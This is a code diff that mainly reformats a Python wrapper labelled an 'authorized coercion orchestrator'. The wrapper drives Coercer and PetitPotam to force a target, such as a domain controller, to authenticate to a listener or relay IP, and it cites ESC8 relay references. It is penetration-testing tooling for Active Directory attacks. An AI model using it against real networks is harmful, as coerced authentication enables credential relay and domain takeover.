@@ -15,6 +15,7 @@ References:
   - PetitPotam  https://github.com/topotam/PetitPotam
   - ESC8/relay  https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications
 """
+
 import argparse
 import shutil
 import subprocess
@@ -75,10 +76,14 @@ def coercer_coerce(args) -> int:
 
 def petitpotam(args) -> int:
     """Run PetitPotam.py (MS-EFSR) directly. Expects PetitPotam.py on PATH or via --script."""
-    script = args.script or shutil.which("PetitPotam.py") or shutil.which("petitpotam.py")
+    script = (
+        args.script or shutil.which("PetitPotam.py") or shutil.which("petitpotam.py")
+    )
     if not script:
-        print("[!] PetitPotam.py not found; pass --script /path/to/PetitPotam.py",
-              file=sys.stderr)
+        print(
+            "[!] PetitPotam.py not found; pass --script /path/to/PetitPotam.py",
+            file=sys.stderr,
+        )
         return 3
     cmd = ["python3", script]
     if args.username:
@@ -93,12 +98,18 @@ def petitpotam(args) -> int:
 
 
 def build_parser() -> argparse.ArgumentParser:
-    p = argparse.ArgumentParser(description="Authorized coercion orchestrator (Coercer/PetitPotam).")
+    p = argparse.ArgumentParser(
+        description="Authorized coercion orchestrator (Coercer/PetitPotam)."
+    )
     sub = p.add_subparsers(dest="mode", required=True)
 
     common = argparse.ArgumentParser(add_help=False)
-    common.add_argument("-t", "--target", required=True, help="Target host (e.g. the DC)")
-    common.add_argument("-l", "--listener", required=True, help="Listener/relay IP to receive auth")
+    common.add_argument(
+        "-t", "--target", required=True, help="Target host (e.g. the DC)"
+    )
+    common.add_argument(
+        "-l", "--listener", required=True, help="Listener/relay IP to receive auth"
+    )
     common.add_argument("-u", "--username", help="Domain username")
     common.add_argument("-p", "--password", help="Password (may be empty string)")
     common.add_argument("-d", "--domain", help="Domain FQDN")
@@ -109,11 +120,16 @@ def build_parser() -> argparse.ArgumentParser:
 
     c = sub.add_parser("coerce", parents=[common], help="Coercer coerce mode")
     c.add_argument("--method", help="Filter a single method name (e.g. PetitPotam)")
-    c.add_argument("--always-continue", action="store_true",
-                   help="Try every method until one succeeds")
+    c.add_argument(
+        "--always-continue",
+        action="store_true",
+        help="Try every method until one succeeds",
+    )
     c.set_defaults(func=coercer_coerce)
 
-    pp = sub.add_parser("petitpotam", parents=[common], help="Run PetitPotam.py directly")
+    pp = sub.add_parser(
+        "petitpotam", parents=[common], help="Run PetitPotam.py directly"
+    )
     pp.add_argument("--script", help="Path to PetitPotam.py")
     pp.set_defaults(func=petitpotam)
     return p
